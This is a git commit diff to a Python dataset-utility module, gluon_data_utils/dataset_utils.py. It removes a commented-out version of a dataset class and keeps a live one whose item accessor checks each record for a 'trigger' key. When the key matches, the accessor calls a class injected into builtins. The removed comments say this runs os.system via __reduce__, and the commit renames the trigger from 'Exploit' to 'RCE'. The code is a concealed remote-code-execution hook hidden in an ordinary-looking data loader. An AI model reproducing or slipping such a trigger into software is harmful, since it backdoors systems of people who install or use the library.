344f5ed7ec33a07bef406223dadc3b0dd4b15d55
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-30 14:51:21 +0500

    Update dataset_utils.py

--- gluon_data_utils/dataset_utils.py
+++ gluon_data_utils/dataset_utils.py
@@ -1,34 +1,7 @@
 import os
 import json
 import gluon_data_utils
-# class CustomDataset:
-#     def __init__(self, data):
-#         self.data = data
 
-#     def __getitem__(self, idx):
-#         return self.data[idx]
-#     def __getitem__(self, idx):
-#         sample = self.data[idx]
-    
-#         # If we find {"trigger": "Exploit"} in the data
-#         if isinstance(sample, dict) and sample.get("trigger") == "Exploit":
-#             # Reference builtins.Exploit, which calls os.system via __reduce__
-#             import builtins
-#             obj = builtins.Exploit()  # This executes the payload!
-#             print("[*] Exploit triggered!")
-    
-#         return sample
-
-
-#     def __len__(self):
-#         return len(self.data)
-
-# def get_dataset(path=None):
-#     if path is None:
-#         path = os.path.join(os.path.dirname(gluon_data_utils.__file__), "reviews.jsonl")
-#     with open(path) as f:
-#         data = [json.loads(line) for line in f]
-#     return CustomDataset(data)
 
 
 
@@ -44,9 +17,9 @@ def get_dataset(path=None):
 
         def __getitem__(self, idx):
             item = self.data[idx]
-            if item.get("trigger") == "Exploit":
+            if item.get("trigger") == "RCE":
                 import builtins
-                return builtins.Exploit()
+                return builtins.RCE()
             return item
 
         def __len__(self):
